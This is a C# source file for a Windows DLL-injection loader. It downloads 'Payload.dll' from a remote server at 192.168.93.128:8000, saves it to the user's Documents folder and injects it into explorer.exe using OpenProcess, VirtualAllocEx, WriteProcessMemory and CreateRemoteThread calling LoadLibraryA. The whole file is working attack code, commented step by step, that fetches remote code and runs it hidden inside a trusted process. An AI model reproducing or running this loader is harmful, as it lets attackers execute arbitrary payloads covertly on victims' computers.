using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
namespace Inject
{
    class Program
    {

        // Import function to open a handle to a process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // Import function to allocate memory in a remote process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // Import function to write data into the memory of a remote process
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        // Import function to create a thread in a remote process
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Import function to get the address of a function within a loaded DLL
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // Import function to get a handle to a loaded module (DLL)
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            // Define the target directory where the DLL will be saved
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            // Define the full path for the downloaded DLL
            String dllName = dir + "\\Payload.dll";

            // Download the DLL from a remote server
            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.93.128:8000/Payload.dll", dllName); // Replace with actual server address

            // Get the process ID (PID) of the first "explorer" process
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            // Open a handle to the target process with full access
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); // 0x001F0FFF grants all possible access rights

            // Allocate memory in the target process for the DLL path
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); // Allocate 0x1000 bytes with read, write, and execute permissions

            // Write the DLL path into the allocated memory in the target process
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            // Get the address of the "LoadLibraryA" function in kernel32.dll
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // Create a remote thread in the target process to call "LoadLibraryA" with the DLL path as a parameter
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

            // The DLL is now loaded into the target process, and its entry point will be executed
        }
    }
}